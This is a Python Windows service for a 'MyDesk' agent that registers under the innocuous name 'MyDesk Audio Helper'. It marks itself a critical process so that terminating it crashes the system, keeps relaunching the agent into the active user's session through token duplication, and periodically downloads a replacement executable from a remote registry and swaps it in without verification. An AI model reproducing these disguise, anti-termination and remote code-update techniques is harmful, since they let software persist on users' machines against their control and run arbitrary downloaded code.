import sys
import time
import os
import json
import urllib.request
import urllib.error
import subprocess
import win32serviceutil
import win32service
import win32event
import servicemanager
import ctypes
from ctypes import windll, byref, c_void_p

# Add parent directory to path to import protection
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
sys.path.append(parent_dir)

# DEBUG LOGGING
try:
    with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
        f.write(f"[{time.ctime()}] Service Process Started: {sys.executable}\n")
except:
    pass

try:
    import protection
except ImportError:
    # Fallback/Mock if running from a different context or compiled
    try:
        from targets import protection
    except:
        protection = None

# Constants
SAFE_MODE_FILE = r"C:\MyDesk\SAFE_MODE.txt"
AGENT_EXE = r"C:\ProgramData\MyDesk\MyDeskAgent.exe"
SERVICE_NAME = "MyDeskAudio"  # The surviving "Shield"
SERVICE_DISPLAY = "MyDesk Audio Helper"
REGISTRY_BASE = "https://mydesk-registry.vercel.app"
AGENT_DIR = r"C:\ProgramData\MyDesk"

try:
    import keyring
    import keyrings.alt.Windows

    # CRITICAL: Same backend as Agent for SYSTEM compatibility
    keyring.set_keyring(keyrings.alt.Windows.RegistryKeyring())
except:
    keyring = None


def is_process_running(process_name):
    """Check if a process is running using tasklist."""
    try:
        # /NH = No Header
        # FIX: Use argument list to prevent command injection
        command = ["tasklist", "/NH", "/FI", f"IMAGENAME eq {process_name}"]
        output = subprocess.check_output(command, stderr=subprocess.STDOUT).decode()
        return process_name.lower() in output.lower()
    except subprocess.CalledProcessError:
        # This can happen if the process is not found, which is not an error here.
        return False
    except Exception:
        return False


def start_service(service_name):
    """Start a Windows Service."""
    try:
        # FIX: Use argument list to prevent command injection
        subprocess.run(["sc", "start", service_name], check=False, capture_output=True)
    except (subprocess.SubprocessError, FileNotFoundError):
        pass


def get_local_version():
    """Get version from Keyring."""
    if not keyring:
        return "0.0.0"
    try:
        ver = keyring.get_password("MyDeskAgent", "agent_version")
        return ver if ver else "0.0.0"
    except:
        return "0.0.0"


def set_local_version(ver):
    """Update version in Keyring."""
    if not keyring:
        return
    try:
        keyring.set_password("MyDeskAgent", "agent_version", ver)
    except:
        pass


def perform_atomic_update():
    """Check registry for new version, download, and swap atomically."""
    try:
        # 1. Get Latest Version info
        with urllib.request.urlopen(
            f"{REGISTRY_BASE}/api/version", timeout=10
        ) as response:
            data = json.loads(response.read().decode())
            remote_ver = data.get("version", "0.0.0")
            download_url = data.get("url")

        local_ver = get_local_version()

        # Semantic Version Comparison (tuple-based)
        def parse_v(v):
            try:
                return tuple(map(int, (v.split("."))))
            except (ValueError, AttributeError):
                return (0, 0, 0)

        if parse_v(remote_ver) > parse_v(local_ver):
            print(f"[*] Update Found: {local_ver} -> {remote_ver}")

            # Resolve full download URL if relative
            if download_url.startswith("/"):
                download_url = REGISTRY_BASE + download_url

            # 2. Download to .tmp (Standard SSL)
            tmp_exe = AGENT_EXE + ".tmp"
            try:
                # Standard urllib (Uses Windows System Certs)
                with urllib.request.urlopen(download_url, timeout=60) as response:
                    with open(tmp_exe, "wb") as f:
                        f.write(response.read())
            except Exception as e:
                print(f"[-] Download Failed: {e}")
                return False

            # 3. Stop Agent to release file lock
            subprocess.run(
                ["taskkill", "/F", "/IM", "MyDeskAgent.exe"],
                shell=False,
                capture_output=True,
            )
            time.sleep(2)

            # 4. Atomic Swap
            if os.path.exists(tmp_exe):
                try:
                    os.replace(tmp_exe, AGENT_EXE)
                    # 5. Update Version in Keyring
                    set_local_version(remote_ver)
                    print(f"[+] Atomic Update Success: {remote_ver}")
                    return True
                except Exception as swap_err:
                    print(f"[-] Atomic Swap Failed: {swap_err}")
                    if os.path.exists(tmp_exe):
                        os.remove(tmp_exe)
    except Exception as e:
        print(f"[-] Update Error: {e}")
    return False


def start_agent_as_user():
    """Launch Agent in the Active User Session (Bypass Session 0 Isolation)."""
    try:

        def log(msg):
            try:
                with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                    f.write(f"[{time.ctime()}] [AgentLaunch] {msg}\n")
            except:
                pass

        # Self-Healing: Check if Agent exists and is executable
        if not os.path.exists(AGENT_EXE):
            log(f"Agent missing at {AGENT_EXE}")
            return False

        if not os.access(AGENT_EXE, os.X_OK):
            log(f"Agent at {AGENT_EXE} is not executable.")
            # On Windows, os.X_OK might be less reliable than existence,
            # but we can at least check if it's a file.
            if not os.path.isfile(AGENT_EXE):
                return False

        # 1. Get Active Session ID (Robust Enumeration)
        # Defines for WTSEnumerateSessions
        class WTS_SESSION_INFO(ctypes.Structure):
            _fields_ = [
                ("SessionId", ctypes.c_ulong),
                ("pWinStationName", ctypes.c_wchar_p),
                ("State", ctypes.c_int),  # WTS_CONNECTSTATE_CLASS
            ]

        WTS_CURRENT_SERVER_HANDLE = 0
        WTSActive = 0

        pSessionInfo = ctypes.POINTER(WTS_SESSION_INFO)()
        count = ctypes.c_ulong()

        session_id = 0xFFFFFFFF

        # Enumerate to find the real active (logged on) session
        if windll.wtsapi32.WTSEnumerateSessionsW(
            WTS_CURRENT_SERVER_HANDLE, 0, 1, byref(pSessionInfo), byref(count)
        ):
            for i in range(count.value):
                si = pSessionInfo[i]
                log(f"Session {si.SessionId}: {si.pWinStationName} (State: {si.State})")
                if si.State == WTSActive:
                    session_id = si.SessionId
                    log(f"MATCH: Found Active Session {session_id}")
                    break

            windll.wtsapi32.WTSFreeMemory(pSessionInfo)
        else:
            log(f"WTSEnumerateSessions Failed: {windll.kernel32.GetLastError()}")

        # Fallback to GetActiveConsoleSessionId if enum failed or found nothing (rare)
        if session_id == 0xFFFFFFFF:
            session_id = windll.kernel32.WTSGetActiveConsoleSessionId()
            log(f"Fallback Session ID: {session_id}")

        if session_id == 0xFFFFFFFF:
            log("No active session found (User likely logged out).")
            return  # No active session

        # 2. Get User Token
        token = c_void_p()
        # WTSQueryUserToken(SessionId, phToken)
        if not windll.wtsapi32.WTSQueryUserToken(session_id, byref(token)):
            err = windll.kernel32.GetLastError()
            log(f"WTSQueryUserToken Failed. Error: {err}")
            return

        # 3. Duplicate Token (Primary)
        primary_token = c_void_p()
        # SecurityImpersonation=2, TokenPrimary=1
        if not windll.advapi32.DuplicateTokenEx(
            token, 0, None, 2, 1, byref(primary_token)
        ):
            err = windll.kernel32.GetLastError()
            log(f"DuplicateTokenEx Failed. Error: {err}")
            windll.kernel32.CloseHandle(token)
            return

        # 4. Environment Block (Optional but good)
        env = c_void_p()
        if not windll.userenv.CreateEnvironmentBlock(byref(env), primary_token, False):
            log("CreateEnvironmentBlock Failed (Non-critical)")
            env = None

        # 5. Startup Info
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", ctypes.c_ulong),
                ("lpReserved", ctypes.c_wchar_p),
                ("lpDesktop", ctypes.c_wchar_p),
                ("lpTitle", ctypes.c_wchar_p),
                ("dwX", ctypes.c_ulong),
                ("dwY", ctypes.c_ulong),
                ("dwXSize", ctypes.c_ulong),
                ("dwYSize", ctypes.c_ulong),
                ("dwXCountChars", ctypes.c_ulong),
                ("dwYCountChars", ctypes.c_ulong),
                ("dwFillAttribute", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("wShowWindow", ctypes.c_ushort),
                ("cbReserved2", ctypes.c_ushort),
                ("lpReserved2", ctypes.c_void_p),
                ("hStdInput", ctypes.c_void_p),
                ("hStdOutput", ctypes.c_void_p),
                ("hStdError", ctypes.c_void_p),
            ]

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        si.lpDesktop = "winsta0\\default"  # Target User Desktop
        si.wShowWindow = 1  # SW_NORMAL (Let's make it visible for now!)
        si.dwFlags = 1  # STARTF_USESHOWWINDOW

        # 6. Process Info
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", ctypes.c_void_p),
                ("hThread", ctypes.c_void_p),
                ("dwProcessId", ctypes.c_ulong),
                ("dwThreadId", ctypes.c_ulong),
            ]

        pi = PROCESS_INFORMATION()

        # 7. Create Process As User
        # CreateProcessAsUserW(hToken, lpapp, lpcmd, ...)
        cmd = f'"{AGENT_EXE}"'  # Command line MUST include executable path if lpApplicationName is None
        # CREATE_UNICODE_ENVIRONMENT (0x400) | CREATE_NEW_CONSOLE (0x10)
        dwCreationFlags = 0x00000410

        log(f"Attempting launch: {cmd} with flags {hex(dwCreationFlags)}")

        success = windll.advapi32.CreateProcessAsUserW(
            primary_token,
            None,
            cmd,
            None,
            None,
            False,
            dwCreationFlags,
            env,
            os.path.dirname(AGENT_EXE),
            byref(si),
            byref(pi),
        )

        # Cleanup
        if env:
            windll.userenv.DestroyEnvironmentBlock(env)
        windll.kernel32.CloseHandle(token)
        windll.kernel32.CloseHandle(primary_token)

        if success:
            log(f"SUCCESS! PID: {pi.dwProcessId}")
            windll.kernel32.CloseHandle(pi.hProcess)
            windll.kernel32.CloseHandle(pi.hThread)
            # Log success if needed
            return True
        else:
            err = windll.kernel32.GetLastError()
            log(f"CreateProcessAsUserW Failed. Error: {err}")
            return False

    except Exception:
        return False


class WatcherService(win32serviceutil.ServiceFramework):
    _svc_name_ = ""
    _svc_display_name_ = ""
    _svc_description_ = ""

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.running = False

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        self.main()

    def main(self):
        # Apply ACLs to THIS service process immediately
        if protection:
            protection.protect_process()

        # Update tick counter
        ticks = 0

        while self.running:
            ticks += 1
            safe_mode_file = os.path.exists(SAFE_MODE_FILE)
            in_safe_mode = protection.is_safe_mode() if protection else False

            # 1. CRITICAL STATUS: Make service unkillable (BSOD if killed)
            if protection and not safe_mode_file and not in_safe_mode:
                # Re-apply every tick to be sure
                protection.set_critical_status(True)
            elif protection:
                protection.set_critical_status(False)

            # 2. AGENT WATCHDOG: Ensure agent is always running
            if not is_process_running("MyDeskAgent.exe"):
                # If Agent is missing or needs update (checked periodically)
                if not os.path.exists(AGENT_EXE):
                    perform_atomic_update()  # Download initial version
                start_agent_as_user()

            # 3. AUTO-UPDATE: Check every ~15 minutes (225 ticks @ 4s)
            if ticks >= 225:
                ticks = 0
                perform_atomic_update()

            # Loop Sleep (4s)
            rc = win32event.WaitForSingleObject(self.hWaitStop, 4000)
            if rc == win32event.WAIT_OBJECT_0:
                break


if __name__ == "__main__":
    try:
        WatcherService._svc_name_ = SERVICE_NAME
        WatcherService._svc_display_name_ = SERVICE_DISPLAY
        WatcherService._svc_description_ = (
            "Manages advanced audio and persistence for MyDesk."
        )

        # FROZEN SERVICE HANDLER
        if len(sys.argv) == 1:
            try:
                servicemanager.Initialize()
                servicemanager.PrepareToHostSingle(WatcherService)
                servicemanager.StartServiceCtrlDispatcher()
            except:
                pass
        else:
            win32serviceutil.HandleCommandLine(WatcherService)

    except Exception:
        pass
